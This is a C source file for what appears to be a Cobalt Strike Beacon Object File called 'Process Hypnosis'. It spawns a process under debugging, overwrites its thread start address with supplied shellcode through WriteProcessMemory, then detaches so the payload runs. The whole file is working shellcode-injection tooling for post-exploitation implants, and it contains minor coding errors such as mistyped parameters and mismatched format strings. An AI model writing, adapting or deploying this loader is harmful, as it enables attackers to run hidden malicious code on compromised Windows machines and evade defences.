#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT BOOL KERNEL32$CreateProcessW(
    _In_opt_      LPCWSTR               lpApplicationName,
    _Inout_opt_   LPWSTR                lpCommandLine,
    _In_opt_      LPSECURITY_ATTRIBUTES lpProcessAttributes,
    _In_opt_      LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_          BOOL                  bInheritHandles,
    _In_          DWORD                 dwCreationFlags,
    _In_opt_      LPVOID                lpEnvironment,
    _In_opt_      LPCWSTR               lpCurrentDirectory,
    _In_          LPSTARTUPINFOW        lpStartupInfo,
    _Out_         LPPROCESS_INFORMATION lpProcessInformation
);

DECLSPEC_IMPORT BOOL KERNEL32$WaitForDebugEvent(
  	_Out_ LPDEBUG_EVENT lpDebugEvent,
  	_In_  DWORD         dwMilliseconds
);

DECLSPEC_IMPORT BOOL KERNEL32$WriteProcessMemory(
    _In_  HANDLE  hProcess,
    _In_  LPVOID  lpBaseAddress,
    _In_  LPCVOID lpBuffer,
    _In_  SIZE_T  nSize,
    _Out_ SIZE_T  *lpNumberOfBytesWritten
);

DECLSPEC_IMPORT BOOL KERNEL32$DebugActiveProcessStop(
    _In_ DWORD dwProcessId
);

DECLSPEC_IMPORT BOOL KERNEL32$ContinueDebugEvent(
    _In_ DWORD dwProcessId,
    _In_ DWORD dwThreadId,
    _In_ DWORD dwContinueStatus
);

DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(
    _In_ HANDLE hObject
);

DECLSPEC_IMPORT DWORD KERNEL32$GetLastError();

void go(char* args, int argc) {
    datap Parser    = { 0 };
    PSTR  Shellcode = { 0 };
    DWORD Length    =  0x00;

    DWORD Pid       = 0x00;
    DWORD Tid       = 0x00;

    WCHAR  SpawnTox64[MAX_PATH] = { 0 };

    BeaconDataParse(&Parser, args, argc);

    Shellcode = BeaconDataExtract(&Parser, &Length);

    BeaconGetSpawnTo( FALSE, SpawnTox64, sizeof( SpawnTox64 ));

    BeaconPrintf(
        CALLBACK_OUTPUT, 
        "[+] Shellcode @ 0x%p [ %d bytes ]\n"
        "[I] SpawnTox64 set to %ls\n",
        Shellcode, Length, SpawnTox64
    );

    ProcessHypnosis( Shellcode, Length, SpawnTox64, &Tid, &Pid );

    BeaconPrintf(
        CALLBACK_OUTPUT,
        "[+] Process Hypnotized at Pid: %d, running in Tid: %d\n",
        Pid, Tid
    );

}

void ProcessHypnosis( _In_ PBYTE pBuffer, _In_ DWORD sBufferSz, _In_ WCHAR SpanwTo, _Out_ DWORD *Tid, _Out_ DWORD *Pid ){

    STARTUPINFO         StartupInfo        = { .cb = sizeof( StartupInfo ) };
    PROCESS_INFORMATION  ProcessInfo       = { 0 };
    DEBUG_EVENT          DebugEvent        = { 0 };
    SIZE_T               sNumOfBytesWrtt   =  0x00;

    BeaconSpawnTemporaryProcess( FALSE, TRUE, &StartupInfo, &ProcessInfo );

    *Tid = ProcessInfo.dwThreadId;
    *Pid = ProcessInfo.dwProcessId;

    while ( KERNEL32$WaitForDebugEvent( &DebugEvent, INFINITE ) ){

        switch ( DebugEvent.dwDebugEventCode ){

            case CREATE_THREAD_DEBUG_EVENT: {
                
                if( !KERNEL32$WriteProcessMemory( ProcessInfo.hProcess, DebugEvent.u.CreateProcessInfo.lpStartAddress, pBuffer, sBufferSz, &sNumOfBytesWrtt ) || sNumOfBytesWrtt != sBufferSz ){
                    BeaconPrintf(CALLBACK_ERROR, "[X] write process memory failed with error\n", KERNEL32$GetLastError());
                    return;
                }

                if ( !KERNEL32$DebugActiveProcessStop( ProcessInfo.dwProcessId ) ){
                    BeaconPrintf(CALLBACK_ERROR, "[X] Debug Active Process Stop failed with error\n", KERNEL32$GetLastError());
                    return;
                }

                KERNEL32$ContinueDebugEvent( DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE );

                goto _END;

            }

            case EXIT_PROCESS_DEBUG_EVENT:
                BeaconPrintf(CALLBACK_OUTPUT, "[I] Remote Process Terminated\n");
                return;

            default:
                break;

        }

        KERNEL32$ContinueDebugEvent( DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE );

    }
	
_END:
	KERNEL32$CloseHandle(ProcessInfo.hProcess);
	KERNEL32$CloseHandle(ProcessInfo.hThread);
	return 0;

}
